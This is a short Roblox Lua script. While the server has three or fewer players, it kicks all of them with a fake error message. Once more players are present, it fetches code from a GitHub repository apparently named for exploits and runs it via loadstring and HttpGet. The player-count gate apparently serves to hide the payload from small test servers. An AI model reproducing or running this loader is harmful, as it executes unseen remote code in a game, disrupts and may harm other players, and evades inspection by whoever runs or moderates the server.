local players = game:GetService("Players")

while true do
    wait(1)
    if #players:GetPlayers() <= 3 then
        for _, player in pairs(players:GetPlayers()) do
            player:Kick("Error: Use in a public server or a server with more than 3 players!")
        end
    else
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/UniversalSH/refs/heads/main/a"))()
        break
    end
end
